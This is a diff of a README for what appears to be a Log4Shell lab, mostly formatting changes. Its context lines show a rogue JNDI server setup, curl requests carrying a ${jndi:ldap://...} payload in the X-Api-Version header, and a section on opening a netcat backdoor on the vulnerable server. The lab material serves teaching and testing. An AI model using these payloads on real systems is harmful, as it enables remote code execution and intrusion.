@@ -89,9 +89,10 @@ The JNDI Server (RogueJNDI) will run a JNDI server (port 1389) and a http server
 ## Run the JNDI server
 
 Start a new console and run the following commands. This will start two servers listening on separate ports.
-1. LDAP Server, port  1389
+
+1. LDAP Server, port 1389
 2. Web Server, port 8000
-The web server will serve the code to execute. The LDAP server will tell the vulnerable app where to load the code to execute.
+   The web server will serve the code to execute. The LDAP server will tell the vulnerable app where to load the code to execute.
 
 ```bash
 cd rogue-jndi
@@ -117,9 +118,8 @@ curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/o=refe
 curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.1.126:1389/o=reference}'
 ```
 
-
-
 ## Backdoor
+
 Let's start a backdor using netcat (nc) on the vulnerable app server.
 
 Restart the jndi server with the following command.
@@ -159,3 +159,5 @@ https://github.com/christophetd/log4shell-vulnerable-app
 https://github.com/veracode-research/rogue-jndi.git
 
 ## Nuclei
+
+https://github.com/projectdiscovery/nuclei
